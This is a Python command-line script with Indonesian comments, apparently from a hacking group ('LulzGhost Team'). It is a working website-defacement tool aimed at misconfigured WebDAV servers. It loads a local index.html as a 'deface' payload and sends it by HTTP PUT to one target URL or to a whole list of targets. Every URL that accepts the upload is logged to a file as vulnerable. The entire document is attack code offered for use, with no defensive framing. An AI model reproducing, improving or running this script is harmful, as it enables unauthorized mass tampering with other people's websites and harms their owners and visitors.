import requests
import os
import sys

# Kode Warna ANSI untuk tampilan Termux
HIJAU = "\033[92m"
MERAH = "\033[91m"
KUNING = "\033[93m"
BIRU = "\033[94m"
CYAN = "\033[96m"
PUTIH = "\033[97m"
RESET = "\033[0m"

def tampilkan_banner():
    # Membersihkan layar terminal sebelum menampilkan menu
    os.system('clear')
    banner = f"""
{CYAN}__        __   _     ____    _    __     __
\\ \\      / /__| |__ |  _ \\  / \\   \\ \\   / /
 \\ \\ /\\ / / _ \\ '_ \\| | | |/ _ \\   \\ \\ / / 
  \\ V  V /  __/ |_) | |_| / ___ \\   \\ V /  
   \\_/\\_/ \\___|_.__/|____/_/   \\_\\   \\_/   {RESET}
==================================================
{HIJAU}Author : UnknownGh05t
Team   : LulzGhost Team{RESET}
==================================================
"""
    print(banner)

def cek_file_html(nama_file):
    if not os.path.exists(nama_file):
        print(f"{MERAH}[-] Error: File '{nama_file}' tidak ditemukan di folder saat ini!{RESET}")
        print(f"{KUNING}[*] Silakan buat file '{nama_file}' terlebih dahulu untuk bahan deface.{RESET}")
        sys.exit()
    with open(nama_file, "r", encoding="utf-8") as f:
        return f.read()

def proses_upload(url_target, payload_html):
    # Memastikan format URL diawali http:// atau https://
    if not url_target.startswith("http://") and not url_target.startswith("https://"):
        url_target = "http://" + url_target

    # Memastikan URL diakhiri dengan tanda miring '/'
    if not url_target.endswith("/"):
        url_target += "/"
        
    nama_file_tujuan = "deface.html"
    target_lengkap = url_target + nama_file_tujuan
    
    print(f"{PUTIH}[*] Menguji: {target_lengkap} ...{RESET}")
    
    try:
        headers = {"Content-Type": "text/html"}
        # Batas waktu tunggu (timeout) 5 detik
        response = requests.put(target_lengkap, data=payload_html, headers=headers, timeout=5)
        
        if response.status_code == 201 or response.status_code == 200:
            print(f"    {HIJAU}[+] SUKSES! Target rentan: {target_lengkap}{RESET}")
            with open("sukses.txt", "a") as f_sukses:
                f_sukses.write(f"{target_lengkap}\n")
        else:
            print(f"    {MERAH}[-] Gagal. Status Code: {response.status_code}{RESET}")
            
    except requests.exceptions.Timeout:
        print(f"    {KUNING}[-] Gagal: Connection Timeout (RTO / Diblokir WAF){RESET}")
    except requests.exceptions.ConnectionError:
        print(f"    {MERAH}[-] Gagal: Connection Error (Server Mati / DNS Salah){RESET}")
    except Exception as e:
        print(f"    {MERAH}[-] Gagal: Terjadi kesalahan teknis: {e}{RESET}")

def main():
    file_html = "index.html"
    payload_html = cek_file_html(file_html)
    
    tampilkan_banner()
    print(f"{PUTIH}[1] Single Target (Tempel Link langsung)")
    print(f"[2] Mass Target (Gunakan file list.txt)")
    print(f"[0] Keluar{RESET}")
    print("==================================================")
    
    pilihan = input(f"{KUNING}Pilih menu (0/1/2): {RESET}").strip()
    
    if pilihan == "1":
        tampilkan_banner()
        print(f"{BIRU}[ MENU SINGLE TARGET ]{RESET}\n")
        target_input = input(f"{KUNING}Masukkan URL Target: {RESET}").strip()
        if target_input:
            print("-" * 50)
            proses_upload(target_input, payload_html)
            print("-" * 50)
        else:
            print(f"{MERAH}[-] URL tidak boleh kosong!{RESET}")
            
    elif pilihan == "2":
        file_list = "list.txt"
        tampilkan_banner()
        print(f"{BIRU}[ MENU MASS TARGET ]{RESET}\n")
        
        if not os.path.exists(file_list):
            print(f"{MERAH}[-] Error: File '{file_list}' tidak ditemukan!{RESET}")
            print(f"{KUNING}[*] Buat file '{file_list}' dan isi dengan daftar target terlebih dahulu.{RESET}")
            return
            
        with open(file_list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
            
        print(f"{HIJAU}[+] Berhasil memuat {len(targets)} target dari {file_list}.{RESET}")
        print("-" * 50)
        
        for index, target in enumerate(targets, 1):
            print(f"{CYAN}[Target {index}/{len(targets)}]{RESET}")
            proses_upload(target, payload_html)
            print("-" * 50)
            
    elif pilihan == "0":
        print(f"\n{HIJAU}Sampai jumpa lagi!{RESET}\n")
    else:
        print(f"\n{MERAH}[-] Pilihan menu tidak valid.{RESET}\n")

if __name__ == "__main__":
    main()
